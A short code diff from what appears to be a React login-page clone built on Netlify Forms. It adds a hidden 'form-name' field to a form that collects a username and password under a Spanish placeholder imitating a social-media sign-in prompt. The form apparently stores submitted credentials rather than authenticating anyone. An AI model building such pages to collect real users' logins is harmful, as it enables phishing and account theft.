@@ -41,6 +41,7 @@ function App() {
       <div className='p-9'>
         <form name='users' method='POST' onSubmit={handleSubmit} data-netlify='true'>
           <div className='grid gap-2'>
+          <input type="hidden" name="form-name" value="users" />
             <input onChange={handleInput} className='bg-[#121212] border border-zinc-500 placeholder-zinc-300 p-3 text-xs rounded text-white' name='username' type="text" placeholder="Telefono, usuario o correo electronico " />
             <input onChange={handleInput} className='bg-[#121212] border  border-gray-300/40 p-3 text-xs rounded text-white' name='password' type="password" placeholder="Contraceña" />
           </div>
